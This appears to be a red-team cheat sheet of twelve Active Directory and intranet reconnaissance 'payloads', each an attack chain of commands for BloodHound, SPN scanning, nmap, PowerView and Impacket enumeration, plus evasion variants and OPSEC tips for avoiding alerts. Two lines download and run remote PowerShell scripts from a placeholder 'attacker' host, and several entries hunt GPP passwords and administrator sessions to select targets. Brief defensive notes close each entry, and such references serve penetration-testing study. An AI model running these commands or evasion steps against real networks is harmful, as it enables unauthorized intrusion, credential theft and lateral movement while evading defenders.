# Information Gathering

_12 intranet payloads_

### BloodHound Domain Analysis  `bloodhound-enumeration`
_Use BloodHound to analyze Active Directory attack paths_
Subcategory: **Domain Analysis** · tags: `bloodhound` `active-directory` `enumeration` `neo4j`

**Prerequisites:**
- Domain environment
- Domain user credentials
- BloodHound tool

**Attack chain:**

**SharpHound collection**
> Use SharpHound to collect domain information
_platform: windows_
```
SharpHound.exe -c All
```
**Syntax breakdown:**
- `SharpHound.exe` — BloodHound data collection tool _command_
- `-c All` — Collect all types of data _parameter_

**PowerShell collection**
> Collect via PowerShell remote loading
_platform: windows_
```
IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All
```
**Syntax breakdown:**
- `Invoke-BloodHound` — PowerShell version of the collection command _command_
- `-CollectionMethod` — Specify the collection method _parameter_

**bloodhound-python**
> Use the Python version to collect
_platform: linux_
```
bloodhound-python -u user -p password -d target.com -ns dc_ip
```
**Syntax breakdown:**
- `bloodhound-python` — Python version of the BloodHound collector _command_
- `-u` — Username _parameter_
- `-d` — Domain name _parameter_
- `-ns` — Name server _parameter_

**Specify domain controller**
> Collect by specifying the domain controller
_platform: windows_
```
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --DomainController dc.target.com
```
**Syntax breakdown:**
- `--LdapUsername` — LDAP authentication username _parameter_
- `--DomainController` — Specify the domain controller _parameter_

**Start Neo4j**
> Start the Neo4j database
_platform: linux_
```
sudo neo4j console
```

**Cypher query for domain admins**
> Query domain administrator users
```
MATCH (n:User) WHERE n.admincount=true RETURN n
```

**Query attack paths**
> Query the shortest path to a domain administrator
```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

**EDR bypass variants:**

**Stealthy collection**
> Randomize file names to avoid detection
```
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --OutputDirectory C:\Users\Public --RandomizeFilenames
```

**Analysis:** BloodHound can discover attack paths within the domain, such as privilege escalation paths, session information, group relationships, etc.

**OPSEC tips:**
- BloodHound collection generates a large number of LDAP queries
- May trigger domain controller alerts
- Recommended to run during off-hours

**Overview:** BloodHound is a tool for analyzing Active Directory trust relationships. It can visualize attack paths and help discover privilege escalation opportunities.

**Vulnerability principle:** The complex trust relationships of Active Directory can lead to unexpected privilege escalation paths, and BloodHound can discover these paths.

**Exploitation method:** Exploitation flow: 1) Collect domain information; 2) Import into BloodHound; 3) Analyze attack paths; 4) Discover privilege escalation opportunities; 5) Execute the attack.

**Defensive measures:** Defensive measures: 1) Regularly audit AD permissions; 2) Principle of least privilege; 3) Monitor abnormal LDAP queries; 4) Clean up unnecessary trust relationships.

---

### SPN Scan  `spn-scan`
_Scan for Service Principal Names within the domain_
Subcategory: **SPN** · tags: `spn` `kerberos` `enumeration`

**Prerequisites:**
- Domain environment
- Any domain user credentials

**Attack chain:**

**Query all SPNs**
> Query all SPNs within the domain
_platform: windows_
```
setspn -T domain.com -Q */*
```
**Syntax breakdown:**
- `setspn` — Service Principal Name tool _command_
- `-T` — Specify the domain _parameter_
- `-Q` — Query mode _parameter_

**PowerShell query**
> PowerShell query for SPN users
_platform: windows_
```
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```
**Syntax breakdown:**
- `Get-ADUser` — Command to get AD users _command_
- `-Filter` — Filter condition _parameter_
- `-Properties` — Properties to return _parameter_

**Impacket query**
> Impacket SPN query
_platform: linux_
```
GetUserSPNs.py domain/user:password -dc-ip dc_ip
```
**Syntax breakdown:**
- `GetUserSPNs.py` — Impacket SPN query tool _command_
- `-dc-ip` — Domain controller IP _parameter_

**Query specific service**
> Query the SPN of the HTTP service
_platform: windows_
```
setspn -T domain.com -Q HTTP/*
```

**Find SQL services**
> Query the SPN of the MSSQL service
_platform: windows_
```
setspn -T domain.com -Q MSSQLSvc/*
```

**Analysis:** SPN scanning can discover service accounts running within the domain, preparing for a Kerberoasting attack.

**OPSEC tips:**
- SPN queries are normal domain operations
- Will not trigger obvious alerts
- Can be used for subsequent Kerberoasting attacks

**Overview:** SPN scanning can discover service accounts running within the domain, preparing for a Kerberoasting attack.

**Vulnerability principle:** SPNs are part of Kerberos authentication, and attackers can use SPNs to find high-value service accounts.

**Exploitation method:** Exploitation flow: 1) Scan SPNs; 2) Identify high-value accounts; 3) Request Kerberos tickets; 4) Crack offline.

**Defensive measures:** Defensive measures: 1) Use strong passwords for service accounts; 2) Monitor abnormal SPN queries; 3) Regularly audit SPN accounts.

---

### Intranet Port Scan  `port-scan`
_Intranet port scanning and service identification_
Subcategory: **Port Scan** · tags: `nmap` `port-scan` `enumeration`

**Prerequisites:**
- Intranet access
- Scanning tools

**Attack chain:**

**Quick scan**
> Quickly scan common ports
_platform: linux_
```
nmap -sS -T4 -F 192.168.1.0/24
```
**Syntax breakdown:**
- `-sS` — SYN scan, half-open scan _parameter_
- `-T4` — Scan speed template (0-5) _parameter_
- `-F` — Fast mode, scan only common ports _parameter_

**Full port scan**
> Scan all 65535 ports
_platform: linux_
```
nmap -sS -p- 192.168.1.1
```
**Syntax breakdown:**
- `-p-` — Scan all ports (1-65535) _parameter_

**Service identification**
> Service version detection and script scanning
_platform: linux_
```
nmap -sV -sC 192.168.1.1
```
**Syntax breakdown:**
- `-sV` — Service version detection _parameter_
- `-sC` — Scan using default scripts _parameter_

**Intranet liveness detection**
> Ping scan to discover live hosts
_platform: linux_
```
nmap -sn 192.168.1.0/24
```
**Syntax breakdown:**
- `-sn` — Ping scan, no port scanning _parameter_

**Masscan quick scan**
> High-speed port scan
_platform: linux_
```
masscan -p1-65535 192.168.1.0/24 --rate=1000
```
**Syntax breakdown:**
- `masscan` — High-speed port scanning tool _command_
- `--rate` — Scan rate (packets/second) _parameter_

**Operating system identification**
> Identify the target operating system
_platform: linux_
```
nmap -O 192.168.1.1
```
**Syntax breakdown:**
- `-O` — Operating system detection _parameter_

**UDP scan**
> Scan common UDP ports
_platform: linux_
```
nmap -sU --top-ports 20 192.168.1.1
```
**Syntax breakdown:**
- `-sU` — UDP scan _parameter_
- `--top-ports` — Scan the N most common ports _parameter_

**Vulnerability scan**
> Use vulnerability scanning scripts
_platform: linux_
```
nmap --script vuln 192.168.1.1
```
**Syntax breakdown:**
- `--script vuln` — Use the vuln category scripts _parameter_

**EDR bypass variants:**

**Stealthy scan**
> Low-speed fragmented scan with random data added
```
nmap -sS -T2 -f --data-length 50 192.168.1.1
```

**Decoy scan**
> Use decoy IPs to obfuscate the scan source
```
nmap -sS -D RND:10 192.168.1.1
```

**Analysis:** Port scanning can discover open services within the intranet and identify potential attack targets.

**OPSEC tips:**
- High-speed scanning may trigger IDS alerts
- Recommended to use a lower rate
- Scan in time intervals

**Overview:** Port scanning is the first step of intranet penetration, used to discover open services and potential attack surfaces.

**Vulnerability principle:** There may be unpatched services or misconfigured services within the intranet.

**Exploitation method:** Exploitation flow: 1) Discover live hosts; 2) Scan open ports; 3) Identify service versions; 4) Look for exploits.

**Defensive measures:** Defensive measures: 1) Close unnecessary services; 2) Configure firewall rules; 3) Monitor abnormal scanning behavior.

---

### Domain Reconnaissance  `domain-recon`
_Active Directory domain environment information gathering_
Subcategory: **Domain Information** · tags: `active-directory` `domain` `enumeration`

**Prerequisites:**
- Domain environment
- Any domain user credentials

**Attack chain:**

**Domain information**
> Get domain information
_platform: windows_
```
net config workstation
```
**Syntax breakdown:**
- `net config` — Display configuration information _command_
- `workstation` — Workstation configuration _value_

**Domain controllers**
> List domain controllers
_platform: windows_
```
nltest /dclist:domain.com
```
**Syntax breakdown:**
- `nltest` — Windows domain tool _command_
- `/dclist` — List domain controllers _parameter_

**Domain users**
> List domain users
_platform: windows_
```
net user /domain
```
**Syntax breakdown:**
- `net user` — User management command _command_
- `/domain` — Specify the domain environment _parameter_

**Domain administrators**
> List the domain administrators group
_platform: windows_
```
net group "Domain Admins" /domain
```

**Domain trust relationships**
> List domain trust relationships
_platform: windows_
```
nltest /domain_trusts
```

**PowerView collection**
> Use PowerView to collect domain information
_platform: windows_
```
IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1"); Get-NetDomain
```

**Get domain policy**
> Get the domain password policy
_platform: windows_
```
Get-DomainPolicy
```

**Get domain controllers**
> Get domain controller information
_platform: windows_
```
Get-NetDomainController
```

**Analysis:** Domain reconnaissance is the foundation of intranet penetration, allowing you to understand the domain structure, users, groups, and other information.

**OPSEC tips:**
- Domain reconnaissance is a normal operation
- Will not trigger obvious alerts
- Prepares for subsequent attacks

**Overview:** Domain reconnaissance is the foundation of intranet penetration, allowing you to understand the domain structure, users, groups, and other information.

**Vulnerability principle:** Active Directory allows regular users to query most domain information by default.

**Exploitation method:** Exploitation flow: 1) Get domain information; 2) Identify high-value targets; 3) Plan the attack path; 4) Execute the attack.

**Defensive measures:** Defensive measures: 1) Restrict LDAP query permissions; 2) Monitor abnormal queries; 3) Implement the principle of least privilege.

---

### Network Reconnaissance  `network-recon`
_Intranet network topology and configuration information gathering_
Subcategory: **Network Information** · tags: `network` `enumeration` `topology`

**Prerequisites:**
- Intranet access

**Attack chain:**

**Network configuration**
> View network configuration
_platform: windows_
```
ipconfig /all
```
**Syntax breakdown:**
- `ipconfig` — Network configuration command _command_
- `/all` — Display detailed information _parameter_

**Routing table**
> View the routing table
_platform: windows_
```
route print
```

**ARP cache**
> View the ARP cache
_platform: windows_
```
arp -a
```

**Network connections**
> View network connections
_platform: windows_
```
netstat -ano
```
**Syntax breakdown:**
- `netstat` — Network statistics command _command_
- `-a` — Display all connections _parameter_
- `-n` — Display addresses in numeric form _parameter_
- `-o` — Display the process ID _parameter_

**DNS cache**
> View the DNS cache
_platform: windows_
```
ipconfig /displaydns
```

**Linux network configuration**
> View network configuration on Linux
_platform: linux_
```
ifconfig -a
```

**Linux routing table**
> View the routing table on Linux
_platform: linux_
```
route -n
```

**traceroute**
> Trace the route
_platform: windows_
```
tracert target_ip
```

**Analysis:** Network reconnaissance allows you to understand the intranet topology, subnet segmentation, gateways, and other information.

**OPSEC tips:**
- These are normal network management commands
- Will not trigger alerts
- Prepares for subsequent lateral movement

**Overview:** Network reconnaissance allows you to understand the intranet topology, subnet segmentation, gateways, and other information.

**Vulnerability principle:** There may be multiple subnets and trust relationships within the intranet, which attackers can leverage for lateral movement.

**Exploitation method:** Exploitation flow: 1) Collect network information; 2) Map the network topology; 3) Discover attack paths; 4) Move laterally.

**Defensive measures:** Defensive measures: 1) Network segmentation and isolation; 2) Restrict cross-subnet access; 3) Monitor abnormal network behavior.

---

### Share Enumeration  `share-enum`
_Enumerate network shared resources_
Subcategory: **Share** · tags: `smb` `share` `enumeration`

**Prerequisites:**
- Intranet access

**Attack chain:**

**Enumerate shares**
> View local shares
_platform: windows_
```
net share
```

**View remote shares**
> View shares on a remote machine
_platform: windows_
```
net view \\target_ip
```

**SMBMap enumeration**
> Use SMBMap to enumerate shares
_platform: linux_
```
smbmap -H target_ip -u user -p password
```
**Syntax breakdown:**
- `smbmap` — SMB share enumeration tool _command_
- `-H` — Target host _parameter_

**CrackMapExec enumeration**
> Use CME to enumerate shares
_platform: linux_
```
crackmapexec smb target_ip -u user -p password --shares
```
**Syntax breakdown:**
- `crackmapexec smb` — CME SMB module _command_
- `--shares` — Enumerate shares _parameter_

**smbclient enumeration**
> Use smbclient to enumerate
_platform: linux_
```
smbclient -L target_ip -U user%password
```
**Syntax breakdown:**
- `smbclient` — SMB client tool _command_
- `-L` — List shares _parameter_

**PowerView enumeration**
> Find interesting shared files
_platform: windows_
```
Find-InterestingDomainShareFile
```

**Analysis:** Share enumeration can discover sensitive files, configuration files, backup files, and other valuable information.

**OPSEC tips:**
- Share enumeration is a normal operation
- May discover sensitive files
- Pay attention to file access logs

**Overview:** Share enumeration can discover shared resources on the network, which may contain sensitive files.

**Vulnerability principle:** Enterprise networks often have misconfigured shares that contain sensitive information.

**Exploitation method:** Exploitation flow: 1) Enumerate shares; 2) Access shares; 3) Search for sensitive files; 4) Obtain credentials or information.

**Defensive measures:** Defensive measures: 1) Audit share permissions; 2) Remove unnecessary shares; 3) Monitor share access.

---

### User Enumeration  `user-enum`
_Enumerate user information within the domain_
Subcategory: **User** · tags: `user` `enumeration` `active-directory`

**Prerequisites:**
- Domain environment
- Any domain user credentials

**Attack chain:**

**List domain users**
> List all domain users
_platform: windows_
```
net user /domain
```

**User details**
> View user details
_platform: windows_
```
net user username /domain
```

**PowerView enumeration**
> Use PowerView to enumerate users
_platform: windows_
```
Get-NetUser | select samaccountname,description,admincount
```

**Find administrators**
> Find domain administrators
_platform: windows_
```
Get-NetUser -AdminCount | select samaccountname
```

**Find active users**
> Find recently logged-in users
_platform: windows_
```
Get-NetUser | Where-Object {$_.lastlogon -gt (Get-Date).AddDays(-30)}
```

**Impacket enumeration**
> Use Impacket to enumerate domain users
_platform: linux_
```
GetADUsers.py -all domain/user:password -dc-ip dc_ip
```

**Analysis:** User enumeration can discover high-value targets, active users, service accounts, etc.

**OPSEC tips:**
- User enumeration is a normal operation
- Select targets for subsequent attacks
- Pay attention to identifying honeypot accounts

**Overview:** User enumeration can discover all users within the domain and identify high-value targets.

**Vulnerability principle:** Active Directory allows regular users to query user information.

**Exploitation method:** Exploitation flow: 1) Enumerate users; 2) Identify high-value targets; 3) Targeted attacks; 4) Obtain credentials.

**Defensive measures:** Defensive measures: 1) Restrict user attribute queries; 2) Deploy honeypot accounts; 3) Monitor abnormal queries.

---

### Group Enumeration  `group-enum`
_Enumerate group information within the domain_
Subcategory: **Group** · tags: `group` `enumeration` `active-directory`

**Prerequisites:**
- Domain environment
- Any domain user credentials

**Attack chain:**

**List domain groups**
> List all domain groups
_platform: windows_
```
net group /domain
```

**Group members**
> View the members of the domain administrators group
_platform: windows_
```
net group "Domain Admins" /domain
```

**PowerView enumeration**
> Use PowerView to enumerate groups
_platform: windows_
```
Get-NetGroup | select samaccountname,admincount
```

**Find high-privilege groups**
> Find high-privilege groups
_platform: windows_
```
Get-NetGroup -AdminCount | select samaccountname
```

**Group membership relationships**
> Get group members
_platform: windows_
```
Get-NetGroupMember "Domain Admins" | select membername
```

**Recursive group members**
> Recursively get group members (including nested groups)
_platform: windows_
```
Get-NetGroupMember "Domain Admins" -Recurse
```

**Analysis:** Group enumeration can discover high-privilege groups, group membership relationships, nested groups, etc.

**OPSEC tips:**
- Group enumeration is a normal operation
- Focus on high-privilege groups
- Pay attention to nested group relationships

**Overview:** Group enumeration can discover all groups within the domain and identify high-privilege groups and membership relationships.

**Vulnerability principle:** Active Directory allows regular users to query group information.

**Exploitation method:** Exploitation flow: 1) Enumerate groups; 2) Identify high-privilege groups; 3) Get group members; 4) Targeted attacks.

**Defensive measures:** Defensive measures: 1) Audit group membership relationships; 2) Principle of least privilege; 3) Monitor abnormal queries.

---

### GPO Enumeration  `gpo-enum`
_Enumerate Group Policy Objects_
Subcategory: **GPO** · tags: `gpo` `group-policy` `enumeration`

**Prerequisites:**
- Domain environment
- Any domain user credentials

**Attack chain:**

**List GPOs**
> List all GPOs
_platform: windows_
```
Get-GPO -All
```

**PowerView enumeration**
> Use PowerView to enumerate GPOs
_platform: windows_
```
Get-NetGPO | select displayname,whencreated
```

**GPO permissions**
> Find restricted groups within GPOs
_platform: windows_
```
Get-NetGPOGroup
```

**GPP passwords**
> Find passwords in GPP
_platform: windows_
```
Get-NetGPPPassword
```

**Find exploitable GPOs**
> Find which GPOs affect a user
_platform: windows_
```
Find-GPOLocation -UserName user
```

**Analysis:** GPO enumeration can discover Group Policy configurations, GPP passwords, restricted groups, and other information.

**OPSEC tips:**
- GPP passwords are a common information leakage point
- GPOs may contain sensitive configurations
- Pay attention to GPO modification permissions

**Overview:** GPO enumeration can discover Group Policy configurations, which may contain sensitive information such as passwords.

**Vulnerability principle:** GPP (Group Policy Preferences) may contain encrypted stored passwords that can be decrypted.

**Exploitation method:** Exploitation flow: 1) Enumerate GPOs; 2) Find GPP passwords; 3) Decrypt passwords; 4) Use the credentials.

**Defensive measures:** Defensive measures: 1) Remove passwords from GPP; 2) Use LAPS to manage local administrator passwords; 3) Monitor GPO modifications.

---

### ACL Enumeration  `acl-enum`
_Enumerate access control lists_
Subcategory: **ACL** · tags: `acl` `access-control` `enumeration`

**Prerequisites:**
- Domain environment
- Any domain user credentials

**Attack chain:**

**PowerView ACL enumeration**
> Get the ACL of a user object
_platform: windows_
```
Get-ObjectAcl -SamAccountName user -ResolveGUIDs
```

**Find dangerous permissions**
> Find interesting ACL permissions
_platform: windows_
```
Find-InterestingDomainAcl -ResolveGUIDs
```

**Find WriteDACL**
> Find WriteDACL permissions
_platform: windows_
```
Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```

**Find GenericAll**
> Find GenericAll permissions
_platform: windows_
```
Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

**BloodHound ACL analysis**
> BloodHound query for ACL relationships
```
MATCH (n)-[r:AllExtendedRights]->(m) RETURN n,m
```

**Analysis:** ACL enumeration can discover permission misconfigurations, such as dangerous permissions like WriteDACL, GenericAll, etc.

**OPSEC tips:**
- ACL misconfigurations are a common privilege escalation path
- Focus on high-value targets
- BloodHound can visualize ACL relationships

**Overview:** ACL enumeration can discover permission misconfigurations in Active Directory.

**Vulnerability principle:** There may be permission misconfigurations in AD that allow low-privilege users to modify high-privilege objects.

**Exploitation method:** Exploitation flow: 1) Enumerate ACLs; 2) Discover permission misconfigurations; 3) Exploit the permissions; 4) Escalate privileges.

**Defensive measures:** Defensive measures: 1) Regularly audit ACLs; 2) Principle of least privilege; 3) Monitor ACL modifications.

---

### Trust Relationship Enumeration  `trust-enum`
_Enumerate domain trust relationships_
Subcategory: **Trust Relationship** · tags: `trust` `enumeration` `active-directory`

**Prerequisites:**
- Domain environment
- Any domain user credentials

**Attack chain:**

**Domain trust relationships**
> List domain trust relationships
_platform: windows_
```
nltest /domain_trusts
```

**PowerView enumeration**
> Use PowerView to enumerate trust relationships
_platform: windows_
```
Get-NetDomainTrust
```

**Forest trust**
> Enumerate forest trust relationships
_platform: windows_
```
Get-NetForestTrust
```

**Trust details**
> View trust details
_platform: windows_
```
Get-NetDomainTrust | select SourceDomain,TargetDomain,TrustType,TrustDirection
```

**Analysis:** Trust relationship enumeration can discover cross-domain/cross-forest attack paths.

**OPSEC tips:**
- Trust relationships may provide cross-domain attack paths
- Pay attention to bidirectional trusts
- Pay attention to SID history issues

**Overview:** Trust relationship enumeration can discover trust relationships between domains, which may provide cross-domain attack paths.

**Vulnerability principle:** Domain trust relationships may allow cross-domain access, and attackers can leverage trust relationships for lateral movement.

**Exploitation method:** Exploitation flow: 1) Enumerate trust relationships; 2) Identify exploitable trusts; 3) Cross-domain attack; 4) Obtain privileges in the target domain.

**Defensive measures:** Defensive measures: 1) Audit trust relationships; 2) Minimize trust scope; 3) Monitor cross-domain access.

---

### Computer Enumeration  `computer-enum`
_Enumerate computers within the domain_
Subcategory: **Computer** · tags: `computer` `enumeration` `active-directory`

**Prerequisites:**
- Domain environment
- Any domain user credentials

**Attack chain:**

**List domain computers**
> List domain computers
_platform: windows_
```
net group "Domain Computers" /domain
```

**PowerView enumeration**
> Use PowerView to enumerate computers
_platform: windows_
```
Get-NetComputer | select name,operatingsystem,ipv4address
```

**Find domain controllers**
> Find domain controllers
_platform: windows_
```
Get-NetComputer -DomainController
```

**Find specific systems**
> Find a specific operating system
_platform: windows_
```
Get-NetComputer -OperatingSystem "*Server 2019*"
```

**Find active computers**
> Find online computers
_platform: windows_
```
Get-NetComputer -Ping
```

**Find administrator sessions**
> Find where domain administrators are logged in
_platform: windows_
```
Find-DomainUserLocation
```

**Analysis:** Computer enumeration can discover all computers within the domain and identify high-value targets.

**OPSEC tips:**
- Computer enumeration is a normal operation
- Focus on domain controllers and servers
- Find administrator sessions

**Overview:** Computer enumeration can discover all computers within the domain and identify high-value targets.

**Vulnerability principle:** Active Directory allows regular users to query computer information.

**Exploitation method:** Exploitation flow: 1) Enumerate computers; 2) Identify high-value targets; 3) Scan services; 4) Move laterally.

**Defensive measures:** Defensive measures: 1) Restrict computer information queries; 2) Monitor abnormal queries; 3) Network segmentation.

---
